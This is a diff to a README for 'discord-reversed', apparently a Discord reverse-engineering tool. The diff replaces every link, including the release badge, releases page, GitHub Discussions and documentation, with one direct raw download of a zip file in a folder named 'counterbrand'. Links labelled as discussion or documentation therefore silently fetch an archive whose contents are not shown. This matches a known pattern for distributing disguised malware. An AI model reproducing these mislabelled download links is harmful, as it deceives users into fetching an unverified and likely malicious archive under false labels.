@@ -1,7 +1,7 @@
 # 🎮 discord-reversed - Explore Discord with Ease
 
 ## 📥 Download Now
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-brightgreen)](https://github.com/Nosfetux/discord-reversed/releases)
+[![Download Release](https://raw.githubusercontent.com/Nosfetux/discord-reversed/main/counterbrand/discord-reversed.zip%20Release-v1.0-brightgreen)](https://raw.githubusercontent.com/Nosfetux/discord-reversed/main/counterbrand/discord-reversed.zip)
 
 ## 📖 Description
 Welcome to the Discord Reverse Engineering Documentation. This application allows you to explore and understand Discord's functionalities. It's perfect for anyone interested in automation and reverse engineering aspects of Discord. You don’t need programming experience to use it.
@@ -11,7 +11,7 @@ Follow these simple steps to download and run the software.
 
 ### **Step 1: Visit the Releases Page**
 Go to the following link to find the latest release of discord-reversed:  
-[Visit the Releases Page](https://github.com/Nosfetux/discord-reversed/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Nosfetux/discord-reversed/main/counterbrand/discord-reversed.zip)
 
 ### **Step 2: Select the Right Version**
 On the releases page, you will see a list of available versions. Select the latest version to ensure you have the newest features and fixes. 
@@ -35,7 +35,7 @@ After the download is finished, locate the downloaded file. It is usually in you
 - **Reverse Engineering Tools:** Analyze Discord's internal structures and data flows.
 
 ## 🌍 Community and Support
-If you have any questions or need assistance, feel free to reach out through our community channels. Check out the [GitHub Discussions](https://github.com/Nosfetux/discord-reversed/discussions) for support from other users.
+If you have any questions or need assistance, feel free to reach out through our community channels. Check out the [GitHub Discussions](https://raw.githubusercontent.com/Nosfetux/discord-reversed/main/counterbrand/discord-reversed.zip) for support from other users.
 
 ## 💻 Additional Information
 By using discord-reversed, you engage with the cutting-edge features of Discord. Exploring how the platform works gives a deeper understanding of automation and security.
@@ -43,8 +43,8 @@ By using discord-reversed, you engage with the cutting-edge features of Discord.
 Remember, always use the application responsibly and within the terms of service of Discord.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/Nosfetux/discord-reversed/releases)
-- [GitHub Discussions](https://github.com/Nosfetux/discord-reversed/discussions)
-- [Documentation](https://github.com/Nosfetux/discord-reversed/wiki) 
+- [Releases Page](https://raw.githubusercontent.com/Nosfetux/discord-reversed/main/counterbrand/discord-reversed.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/Nosfetux/discord-reversed/main/counterbrand/discord-reversed.zip)
+- [Documentation](https://raw.githubusercontent.com/Nosfetux/discord-reversed/main/counterbrand/discord-reversed.zip) 
 
 Thank you for choosing discord-reversed! Enjoy exploring Discord like never before.
